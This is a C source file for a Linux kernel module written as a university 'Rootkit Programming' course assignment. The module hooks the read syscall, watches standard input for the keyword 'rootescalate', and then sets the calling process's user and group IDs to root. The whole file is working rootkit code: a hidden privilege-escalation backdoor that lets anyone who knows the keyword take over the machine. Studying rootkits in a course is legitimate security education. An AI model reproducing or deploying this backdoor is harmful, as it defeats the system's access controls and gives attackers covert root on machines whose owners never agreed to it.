
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: privil_escalation.c                                             */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all modules */
#include <linux/unistd.h>		/* Needed for __NR_read */
#include <linux/thread_info.h>
#include <linux/sched.h>

#include "core.h"

/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit privil_escalation: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
#define PRIV_ESC "rootescalate"


/* Definition of global variables */
static int show_debug_messages;
int priv_escalate_matched_so_far;


/* Definition of functions */
int privil_escalation_init(int);
int privil_escalation_exit(void);

asmlinkage long privil_escalation_read_syscall(unsigned int, char __user *, size_t, long);

static int count_matches(char *, char *, int *);
static void set_root_cred(void);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int privil_escalation_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	register_callback(__NR_read, (void *)privil_escalation_read_syscall);

	DEBUG_PRINT("initialized");

	return 0;
}


int privil_escalation_exit(void)
{
	deregister_callback(__NR_read, (void *)privil_escalation_read_syscall);

	DEBUG_PRINT("exited");

	return 0;
}


/* Function that replaces the original read syscall. In addition to what
   read syscall does, it also looks for a command. ... */
asmlinkage long privil_escalation_read_syscall(unsigned int fd, char __user *buf, size_t count, long ret)
{
	/* If the read was not from STDIN don't do anything */
	if (fd != 0)
		return ret;

	/* Check if `rootescalate` was typed */
	if (count_matches(buf, PRIV_ESC, &priv_escalate_matched_so_far))
		set_root_cred();

	return ret;
}


/* Count matches of specified command in the user input */
static int count_matches(char *buf, char *command, int *chars_matched_so_far)
{
	int matches;
	int i;

	/* Match the command */
	matches = i = 0;
	while (i < strlen(buf)) {
		if (command[(*chars_matched_so_far)++] != buf[i++])
			*chars_matched_so_far = 0;

		if (strlen(command) == *chars_matched_so_far) {
			*chars_matched_so_far = 0;
			matches++;
		}
	}

	return matches;
}


static void set_root_cred(void)
{
	struct cred *pcred;

	pcred = prepare_creds();

	pcred->uid.val = pcred->euid.val = pcred->suid.val = pcred->fsuid.val = 0;
	pcred->gid.val = pcred->egid.val = pcred->sgid.val = pcred->fsgid.val = 0;

	commit_creds(pcred);

	printk(KERN_INFO "rootkit privil_escalation: successfully escalated priviledges for PID: %d\n", current->pid);
}


/* static void set_cred(void)
{
	struct cred *elevated = prepare_creds();

	elevated->suid = current->cred->uid;
	elevated->sgid = current->cred->gid;

	elevated->uid.val = 0;
	elevated->gid.val = 0;
	elevated->euid = elevated->uid;
	elevated->egid = elevated->gid;

	commit_creds(elevated);

	printk(KERN_INFO "saved uid: %d gid: %d\n", current->cred->suid.val, current->cred->sgid.val);
} */


/* static void restore_cred(void)
{
	struct cred *lowered = prepare_creds();

	lowered->uid = current->cred->suid;
	lowered->gid = current->cred->sgid;
	lowered->euid = lowered->uid;
	lowered->egid = lowered->gid;

	lowered->suid.val = lowered->sgid.val = 0;

	commit_creds(lowered);

	printk(KERN_INFO "restored uid: %d gid: %d\n", current->cred->uid.val, current->cred->gid.val);

} */

